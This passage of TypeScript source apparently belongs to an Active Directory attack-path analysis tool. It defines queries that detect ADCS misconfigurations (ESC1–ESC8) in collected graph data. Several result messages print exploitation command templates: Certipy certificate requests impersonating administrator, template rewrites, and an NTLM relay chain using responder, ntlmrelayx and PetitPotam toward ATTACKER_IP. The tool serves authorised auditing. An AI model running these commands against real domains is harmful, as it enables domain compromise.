            const extraNodes = vulnTemplates.filter(n => !sub.nodes.find(s => s.id === n.id));
            const fullSub: BHGraph = {
                nodes: [...sub.nodes, ...extraNodes],
                edges: sub.edges,
            };

            const findings = [
                `âš ï¸ ${vulnTemplates.length} ESC1-vulnerable template(s) â€” enrollee can supply SAN.`,
                enrollers.length > 0 ? `   ${enrollers.length} principal(s) can enroll.` : '   No Enroll edges found â€” check ACEs manually.',
                '',
                ...vulnTemplates.slice(0, 8).map(n => {
                    const published = publishedEdges.filter(e => e.source === n.id);
                    const caNames   = published.map(e => nameOf(graph, e.target)).join(', ');
                    const p = n.properties ?? {};
                    const ekuList: string[] = p.ekus ?? p.certificateapplicationpolicy ?? [];
                    return `  â€¢ ${n.name}${caNames ? ` â†’ CA: ${caNames}` : ''}  EKUs: [${ekuList.join(', ') || 'Any'}]`;
                }),
                vulnTemplates.length > 8 ? `  â€¦ and ${vulnTemplates.length - 8} more` : '',
                '',
                'Exploit (Certipy):',
                '  certipy req -u USER@DOMAIN -p PASS -dc-ip DC -ca CA_NAME -template TEMPLATE -upn administrator@DOMAIN',
                '  certipy auth -pfx administrator.pfx -dc-ip DC',
            ].filter(s => s !== undefined) as string[];

            return { subgraph: fullSub, findings, count: vulnTemplates.length };
        },
    },

    {
        id: 'adcs-esc2',
        name: 'ESC2 â€” Any Purpose / No EKU',
        description:
            'Templates with the Any Purpose EKU or no EKU at all â€” can be used for client auth even if not explicitly listed.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'ðŸ“œ',
        run(graph) {
            const vulnTemplates = graph.nodes.filter(n => {
                if (n.type !== 'CertTemplate') return false;
                const p  = n.properties ?? {};
                const ok = p.requiresmanagerapproval !== true;
                if (!ok) return false;
                const ekus: string[] = p.ekus ?? p.certificateapplicationpolicy ?? [];
                // No EKU list OR contains Any Purpose OID
                return ekus.length === 0 || ekus.includes('2.5.29.37.0');
            });

            const templateIds  = new Set(vulnTemplates.map(n => n.id));
            const enrollEdges  = graph.edges.filter(
                e => (e.label === 'Enroll' || e.label === 'AllExtendedRights' || e.label === 'GenericAll') &&
                     templateIds.has(e.target)
            );
            const publishEdges = graph.edges.filter(
                e => e.label === 'PublishedTo' && templateIds.has(e.source)
            );
            const sub = edgeSubgraph([...enrollEdges, ...publishEdges], graph);
            const extra = vulnTemplates.filter(n => !sub.nodes.find(s => s.id === n.id));

            const findings = [
                `${vulnTemplates.length} ESC2 template(s) â€” Any Purpose EKU or no EKU constraint.`,
                ...vulnTemplates.slice(0, 8).map(n => `  â€¢ ${n.name}`),
                vulnTemplates.length > 8 ? `  â€¦ and ${vulnTemplates.length - 8} more` : '',
            ].filter(Boolean);

            return {
                subgraph: { nodes: [...sub.nodes, ...extra], edges: sub.edges },
                findings,
                count: vulnTemplates.length,
            };
        },
    },

    {
        id: 'adcs-esc3',
        name: 'ESC3 â€” Enrollment Agent Templates',
        description:
            'Templates with the Certificate Request Agent EKU. Lets an enrollee request certs ON BEHALF of any user in an ESC3-B template.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'ðŸ“œ',
        run(graph) {
            const CERT_REQUEST_AGENT = '1.3.6.1.4.1.311.20.2.1';
            const agentTemplates = graph.nodes.filter(n =>
                n.type === 'CertTemplate' &&
                (n.properties?.ekus ?? n.properties?.certificateapplicationpolicy ?? []).includes(CERT_REQUEST_AGENT) &&
                n.properties?.requiresmanagerapproval !== true
            );

            const templateIds = new Set(agentTemplates.map(n => n.id));
            const enrollEdges = graph.edges.filter(
                e => (e.label === 'Enroll' || e.label === 'AllExtendedRights' || e.label === 'GenericAll') &&
                     templateIds.has(e.target)
            );
            const sub   = edgeSubgraph(enrollEdges, graph);
            const extra = agentTemplates.filter(n => !sub.nodes.find(s => s.id === n.id));

            const findings = [
                `${agentTemplates.length} ESC3 enrollment agent template(s) â€” Certificate Request Agent EKU.`,
                ...agentTemplates.slice(0, 8).map(n => `  â€¢ ${n.name}`),
                agentTemplates.length > 8 ? `  â€¦ and ${agentTemplates.length - 8} more` : '',
            ].filter(Boolean);

            return {
                subgraph: { nodes: [...sub.nodes, ...extra], edges: sub.edges },
                findings,
                count: agentTemplates.length,
            };
        },
    },

    {
        id: 'adcs-esc4',
        name: 'ESC4 â€” Writable Template ACEs',
        description:
            'Principals with write control (GenericAll, GenericWrite, WriteDACL, WriteOwner) on a CertTemplate â€” can reconfigure it into ESC1.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'âœï¸',
        run(graph) {
            const WRITE = new Set(['GenericAll', 'GenericWrite', 'WriteDACL', 'WriteOwner', 'Owns', 'WriteAccountRestrictions']);
            const edges = graph.edges.filter(e => {
                if (!WRITE.has(e.label)) return false;
                const target = graph.nodes.find(n => n.id === e.target);
                return target?.type === 'CertTemplate';
            });
            const sub = edgeSubgraph(edges, graph);
            const templates = [...new Set(edges.map(e => e.target))];

            const findings = [
                `${edges.length} write-ACE(s) on ${templates.length} CertTemplate(s) â€” ESC4 (template reconfiguration).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’[${e.label}]â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
                '',
                'Exploit (Certipy):',
                '  certipy template -u USER@DOMAIN -p PASS -dc-ip DC -template TEMPLATE -save-old',
                '  # then request as ESC1 with -upn administrator@DOMAIN',
                '  certipy template -u USER@DOMAIN -p PASS -dc-ip DC -template TEMPLATE -configuration TEMPLATE.json',
            ].filter(Boolean);

            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'adcs-esc6',
        name: 'ESC6 â€” CA EDITF_ATTRIBUTESUBJECTALTNAME2',
        description:
            '[Requires SharpHound CE / Certipy data] EDITF_ATTRIBUTESUBJECTALTNAME2 is a CA registry flag ' +
            '(not in LDAP). SharpHound CE reads it via ICertAdminD2 RPC. ' +
            'If flag is set, any template on that CA can have attacker-supplied SAN. ' +
            'Use â€œcertipy find -vulnerableâ€ or â€œCertify.exe casâ€ to enumerate manually.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'ðŸ­',
        run(graph) {
            const caNodes = graph.nodes.filter(n =>
                n.type === 'EnterpriseCA' || n.type === 'ADCSCA' || n.type === 'CA'
            );
            const hasRpcData = caNodes.some(n =>
                n.properties?.isuserspecifiessanenabled !== undefined ||
                n.properties?.userspecifiessanenabled    !== undefined ||
                n.properties?.editflagattributesubjectaltname2 !== undefined
            );
            if (!hasRpcData) {
                return {
                    subgraph: { nodes: [], edges: [] },
                    findings: [
                        '\u274c ESC6 cannot be detected from pure LDAP / SharpHound data.',
                        '',
                        'EDITF_ATTRIBUTESUBJECTALTNAME2 is a CA registry key, not stored in AD/LDAP.',
                        'SharpHound CE reads it via ICertAdminD2 RPC; plain SharpHound cannot.',
                        '',
                        'Check manually:',
                        '  certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable -stdout',
                        '  Certify.exe cas',
                    ],
                    count: 0,
                };
            }
            const vulnCAs = graph.nodes.filter(n =>
                (n.type === 'EnterpriseCA' || n.type === 'ADCSCA' || n.type === 'CA') &&
                (
                    n.properties?.isuserspecifiessanenabled === true ||
                    n.properties?.userspecifiessanenabled    === true ||
                    n.properties?.editflagattributesubjectaltname2 === true ||
                    // bitmask: EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000
                    (typeof n.properties?.enrollmentflag === 'number' &&
                        (n.properties.enrollmentflag & 0x00040000) !== 0)
                )
            );
            const sub = nodeSubgraph(vulnCAs, graph, false);

            // Enroll edges from any principal to any template published on one of these CAs
            const caIds = new Set(vulnCAs.map(n => n.id));
            const publishEdges = graph.edges.filter(
                e => e.label === 'PublishedTo' && caIds.has(e.target)
            );
            const templateIds2 = new Set(publishEdges.map(e => e.source));
            const enrollEdges  = graph.edges.filter(
                e => (e.label === 'Enroll' || e.label === 'AllExtendedRights') && templateIds2.has(e.target)
            );

            const findings = [
                `âš ï¸ ${vulnCAs.length} CA(s) with EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) â€” ANY template becomes ESC1.`,
                ...vulnCAs.slice(0, 5).map(n => `  â€¢ ${n.name}`),
                '',
                `  ${publishEdges.length} template(s) published to vulnerable CA(s).`,
                `  ${[...new Set(enrollEdges.map(e => e.source))].length} principal(s) with Enroll rights on those templates.`,
            ].filter(Boolean);

            const combinedEdges = [...publishEdges, ...enrollEdges];
            const combined: BHGraph = {
                nodes: [
                    ...sub.nodes,
                    ...edgeSubgraph(combinedEdges, graph).nodes.filter(n => !sub.nodes.find(s => s.id === n.id)),
                ],
                edges: combinedEdges,
            };

            return { subgraph: combined, findings, count: vulnCAs.length };
        },
    },

    {
        id: 'adcs-esc7',
        name: 'ESC7 â€” CA Officer / Manager ACE',
        description:
            '[Requires SharpHound CE / Certipy data] ManageCA and ManageCertificates are CA-internal ' +
            'security roles stored in the CA registry, NOT the AD object nTSecurityDescriptor. ' +
            'Only detectable via RPC (ICertAdminD). SharpHound CE populates these; pure LDAP collectors cannot.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'ðŸ›ï¸',
        run(graph) {
            const MANAGE  = new Set(['ManageCertificates', 'ManageCA', 'GenericAll']);
            const caNodes = graph.nodes.filter(n =>
                n.type === 'EnterpriseCA' || n.type === 'ADCSCA' || n.type === 'CA'
            );
            // ManageCA/ManageCertificates are CA internal security roles stored in the CAâ€™s
            // registry security descriptor â€” NOT in the AD object nTSecurityDescriptor.
            // SharpHound CE collects them via RPC; pure LDAP collectors cannot see them.
            // We can detect them if SharpHound CE populated manageca/managecertificates
            // properties, or if explicit ManageCA/ManageCertificates edges exist.
            const hasRpcEdges = graph.edges.some(
                e => e.label === 'ManageCertificates' || e.label === 'ManageCA'
            );
            const hasRpcProps = caNodes.some(n =>
                n.properties?.managecertificatesaccess !== undefined ||
                n.properties?.manageca                 !== undefined
            );

            if (!hasRpcEdges && !hasRpcProps) {
                const noDataFindings = [
                    'âŒ ESC7 cannot be detected from pure LDAP / SharpHound data.',
                    '',
                    'ManageCA and ManageCertificates are CA-internal security roles stored',
                    'in the CAâ€™s own registry security descriptor â€” NOT the AD object ACL.',
                    'They require RPC to the CA to enumerate (ICertAdminD interface).',
                    '',
                    caNodes.length > 0
                        ? `Found ${caNodes.length} CA(s) but no ManageCA/ManageCertificates edges or properties.`
                        : 'No EnterpriseCA nodes found in this dataset at all.',
                    '',
                    'Use one of these to enumerate properly:',
                    '  certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable -stdout',
                    '  Certify.exe cas',
                ];
                return { subgraph: { nodes: [], edges: [] }, findings: noDataFindings, count: 0 };
            }

            const edges = graph.edges.filter(e => {
                if (!MANAGE.has(e.label)) return false;
                const target = graph.nodes.find(n => n.id === e.target);
                return target?.type === 'EnterpriseCA' || target?.type === 'ADCSCA' || target?.type === 'CA';
            });
            const sub = edgeSubgraph(edges, graph);

            const findings = [
                `${edges.length} management ACE(s) on Enterprise CA(s) (ESC7).`,
                ...edges.slice(0, 8).map(e =>
                    `  â€¢ ${nameOf(graph, e.source)} â†’[${e.label}]â†’ ${nameOf(graph, e.target)}`
                ),
                edges.length > 8 ? `  â€¦ and ${edges.length - 8} more` : '',
            ].filter(Boolean);

            return { subgraph: sub, findings, count: edges.length };
        },
    },

    {
        id: 'adcs-esc8',
        name: 'ESC8 â€” HTTP Web Enrollment Relay',
        description:
            '[Requires SharpHound CE / Certipy data] Whether HTTP (not HTTPS) web enrollment is active ' +
            'on a CA cannot be determined from LDAP alone â€” it requires an HTTP probe or RPC call to the CA. ' +
            'SharpHound CE sets webenrollmenthttps=false when it detects plain HTTP. ' +
            'If your data came from a pure LDAP collector, this queryâ€™s results will be unreliable.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'ðŸŒ',
        run(graph) {
            const caNodes = graph.nodes.filter(n =>
                n.type === 'EnterpriseCA' || n.type === 'ADCSCA' || n.type === 'CA'
            );
            const hasRpcData = caNodes.some(n =>
                n.properties?.webenrollmenthttps !== undefined ||
                n.properties?.webenrollmenthttp  !== undefined ||
                n.properties?.httpwebenrollment  !== undefined
            );
            if (!hasRpcData) {
                return {
                    subgraph: { nodes: [], edges: [] },
                    findings: [
                        '\u274c ESC8 cannot be detected from pure LDAP / SharpHound data.',
                        '',
                        'HTTP web enrollment status requires an HTTP probe or RPC call to',
                        'the CA. SharpHound CE collects this; plain SharpHound does not.',
                        '',
                        caNodes.length > 0
                            ? `Found ${caNodes.length} CA node(s) but no web-enrollment properties.`
                            : 'No EnterpriseCA nodes found in this dataset at all.',
                        '',
                        'Check manually:',
                        '  certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable -stdout',
                        '  curl -s -o /dev/null -w "%{http_code}" http://CA_HOST/certsrv/',
                    ],
                    count: 0,
                };
            }
            const vulnCAs = caNodes.filter(n => {
                const p = n.properties ?? {};
                return p.webenrollmenthttps === false ||
                       p.webenrollmenthttp  === true  ||
                       p.httpwebenrollment  === true;
            });
            const sub = nodeSubgraph(vulnCAs, graph, false);
            const findings = vulnCAs.length > 0 ? [
                `\u26a0\ufe0f ${vulnCAs.length} CA(s) with HTTP web enrollment \u2014 ESC8 relay target.`,
                ...vulnCAs.map(n => {
                    const p    = n.properties ?? {};
                    const host = p.dnshostname ?? p.caname ?? n.name;
                    return `  \u2022 ${n.name}  host: ${host}`;
                }),
                '',
                'Relay attack steps:',
                '  1. responder -I eth0 --no-smb --no-http-server',
                '  2. ntlmrelayx -t http://CA_HOST/certsrv/certfnsh.asp --adcs --template DomainController',
                '  3. PetitPotam.py ATTACKER_IP DC_IP',
                '  4. certipy auth -pfx dc.pfx -dc-ip DC_IP',
            ] : ['No CA with confirmed HTTP web enrollment found.'];
            return { subgraph: sub, findings, count: vulnCAs.length };
        },
    },

    {
        id: 'adcs-enroll-high-priv',
        name: 'Enroll Rights on Templates â†’ DA',
        description:
            'Shortest paths from principals with template Enroll rights to Domain Admins â€” find who can abuse any ADCS template for escalation.',
        category: 'adcs',
        requiresOwned: false,
        icon: 'ðŸ“œâ†’ðŸŽ¯',
        run(graph) {
            const enrollerIds = new Set(
                graph.edges
                    .filter(e => e.label === 'Enroll' || e.label === 'AllExtendedRights')
                    .map(e => e.source)
            );
            const targets  = new Set(graph.nodes.filter(isDomainAdminNode).map(n => n.id));
            const subgraph = bfsShortestPaths(graph, enrollerIds, targets);

            const findings = subgraph.nodes.length > 0
                ? [
                    `Found path(s) from ${enrollerIds.size} principal(s) with Enroll rights to Domain Admins â€” ${subgraph.edges.length} edges.`,
                    'Investigate Enroll + ESC1/ESC2/ESC3 chains for privilege escalation.',
                ]
                : ['No direct BFS path from Enroll holders to Domain Admins found.'];

            return { subgraph, findings, count: subgraph.nodes.length };
        },
    },

    {
        id: 'adcs-owned-to-esc1',
        name: 'Owned â†’ ESC1 Template',
        description:
            'Can owned principals enroll in an ESC1 vulnerable template right now?',
        category: 'adcs',
        requiresOwned: true,
        icon: 'ðŸ´â†’ðŸ“œ',
        run(graph, owned) {
            const AUTH_EKUS = new Set([
                '1.3.6.1.5.5.7.3.2', '1.3.6.1.4.1.311.20.2.2',
                '1.3.6.1.5.2.3.4', '2.5.29.37.0', '',
            ]);
            const esc1Ids = new Set(
                graph.nodes.filter(n => {
                    if (n.type !== 'CertTemplate') return false;
                    const p = n.properties ?? {};
                    const supplySan =
                        p.enrolleeSuppliesSubject === true ||
                        p.enrolleesuppliessubject === true ||
                        (typeof p.certificatenameflag === 'number' && (p.certificatenameflag & 0x1) !== 0);
                    if (!supplySan) return false;
                    if (p.requiresmanagerapproval === true) return false;
                    const ekus: string[] = p.ekus ?? p.certificateapplicationpolicy ?? [];
                    return ekus.length === 0 || ekus.some((e: string) => AUTH_EKUS.has(e));
                }).map(n => n.id)
            );

            const edges = graph.edges.filter(
                e => owned.has(e.source) &&
                     (e.label === 'Enroll' || e.label === 'AllExtendedRights' || e.label === 'GenericAll') &&
                     esc1Ids.has(e.target)
            );
            const sub = edgeSubgraph(edges, graph);

            const findings = edges.length > 0
                ? [
                    `âœ… ${edges.length} owned object(s) can directly enroll in ${[...new Set(edges.map(e => e.target))].length} ESC1 template(s)!`,
                    ...edges.slice(0, 6).map(e =>
                        `  â€¢ ${nameOf(graph, e.source)} â†’[${e.label}]â†’ ${nameOf(graph, e.target)}`
                    ),
                ]
                : ['No owned object has direct Enroll rights on ESC1-vulnerable templates.'];

            return { subgraph: sub, findings, count: edges.length };
        },
    },
];

// â”€â”€ Category metadata â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

export const QUERY_CATEGORIES: { id: QueryCategory; label: string; icon: string }[] = [
    { id: 'paths',      label: 'Attack Paths',  icon: 'ðŸŽ¯' },
    { id: 'kerberos',   label: 'Kerberos',       icon: 'ðŸ”‘' },
    { id: 'acl',        label: 'ACL / Control',  icon: 'âš ï¸' },
    { id: 'delegation', label: 'Delegation',     icon: 'ðŸŽ­' },
    { id: 'highvalue',  label: 'High Value',     icon: 'ðŸ‘‘' },
    { id: 'adcs',       label: 'ADCS / ESC',     icon: 'ðŸ“œ' },
];
